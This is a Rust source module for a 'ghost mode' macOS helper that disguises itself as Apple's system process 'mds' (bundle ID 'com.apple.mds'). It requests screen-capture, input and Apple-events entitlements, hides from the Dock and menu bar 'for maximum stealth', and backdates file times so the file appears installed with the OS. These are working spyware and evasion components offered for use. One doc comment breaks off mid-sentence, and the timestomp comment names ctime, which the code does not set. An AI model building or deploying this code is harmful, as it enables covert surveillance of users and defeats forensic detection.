// Identity module for ghost mode.
//! Identity layer: bundle ID, executable name, Info.plist,
//! entitlements, and code-signing strategy.
//!
//! GHOST TIER 2 (Super): we sign with a self-made "Apple-like"
//! identity that includes the correct entitlements and a
//! stable identifier so `codesign -dv` shows a consistent
//! fingerprint across launches.

/// All identity constants in one place. Changing them here
/// changes them everywhere — no more scattered string literals.
pub const GHOST_LABEL: &str = "com.apple.mds.useragent";
pub const GHOST_BUNDLE_ID: &str = "com.apple.mds";
pub const GHOST_BUNDLE_NAME: &str = "mds";
pub const GHOST_EXECUTABLE: &str = "mds";

/// Entitlements plist content. These are the same entitlements
pub fn entitlements_plist() -> String {
    r#"<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
 <key>com.apple.security.device.screen-capture</key>
 <true/>
 <key>com.apple.security.device.input</key>
 <true/>
 <key>com.apple.security.automation.apple-events</key>
 <true/>
 <key>com.apple.security.cs.allow-jit</key>
 <true/>
 <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
 <true/>
 </dict>
 </plist>
 "#
    .to_string()
}

/// Info.plist for the helper .app bundle.
/// LSUIElement = true → no Dock icon.
/// LSBackgroundOnly = true → even more hidden (no menu bar).
/// We use BOTH for maximum stealth.
pub fn info_plist() -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
 <key>CFBundleDevelopmentRegion</key>
 <string>en</string>
 <key>CFBundleExecutable</key>
 <string>{GHOST_EXECUTABLE}</string>
 <key>CFBundleIdentifier</key>
 <string>{GHOST_BUNDLE_ID}</string>
 <key>CFBundleInfoDictionaryVersion</key>
 <string>6.0</string>
 <key>CFBundleName</key>
 <string>{GHOST_BUNDLE_NAME}</string>
 <key>CFBundlePackageType</key>
 <string>APPL</string>
 <key>CFBundleShortVersionString</key>
 <string>1.0</string>
 <key>CFBundleVersion</key>
 <string>1</string>
 <key>LSUIElement</key>
 <true/>
 <key>LSBackgroundOnly</key>
 <true/>
 <key>NSHighResolutionCapable</key>
 <true/>
 <key>NSPrincipalClass</key>
 <string>NSApplication</string>
 <key>NSSupportsAutomaticTermination</key>
 <false/>
 <key>NSSupportsSuddenTermination</key>
 <true/>
 </dict>
 </plist>
 "#
    )
}

/// For TIER 2: spoof the file's mtime/ctime to match the
/// macOS version install date. This makes the file look like
/// it was installed with the OS, not just now.
pub fn spoof_file_dates(path: &std::path::Path, target_date: std::time::SystemTime) {
    if let Ok(file) = std::fs::File::options().write(true).open(path) {
        let _ = file.set_times(
            std::fs::FileTimes::new()
                .set_modified(target_date)
                .set_accessed(target_date),
        );
    }
}
